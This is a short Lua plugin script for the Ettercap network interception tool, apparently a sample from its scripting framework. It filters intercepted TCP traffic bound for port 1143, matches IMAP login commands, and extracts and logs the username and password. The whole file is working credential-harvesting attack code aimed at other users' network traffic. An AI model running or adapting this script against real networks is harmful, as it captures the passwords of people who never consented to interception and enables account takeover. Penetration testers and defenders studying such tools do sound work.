---
--    Copyright (C) Ryan Linn and Mike Ryan
--
--    This program is free software; you can redistribute it and/or modify
--    it under the terms of the GNU General Public License as published by
--    the Free Software Foundation; either version 2 of the License, or
--    (at your option) any later version.
--
--    This program is distributed in the hope that it will be useful,
--    but WITHOUT ANY WARRANTY; without even the implied warranty of
--    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
--    GNU General Public License for more details.
--
--    You should have received a copy of the GNU General Public License
--    along with this program; if not, write to the Free Software
--    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.


description = "This is a test script to gather imap data";

require 'os'
local ffi = require('ettercap_ffi')
local hook_points = require("hook_points")
local shortpacket = require("shortpacket")
local shortsession = require("shortsession")
local packet = require("packet")

hook_point = hook_points.filter

packetrule = function(packet_object)
  if packet.is_tcp(packet_object) == false then
    return false
  end

  local dst_port = ffi.C.ntohs(packet_object.L4.dst)
  
  if not( dst_port == 1143) then
	return false
  end

  -- Check to see if it starts with the right stuff.
  return true
end


-- Here's your action.
action = function(packet_object) 
  local buf = packet.read_data(packet_object)
  if string.match(buf,"login") then
	user,password = string.match(buf,"login \"(%S+)\" \"(%S+)\"")
        ettercap.log("Got IMAP User %s:%s\n",user,password)
  end
end
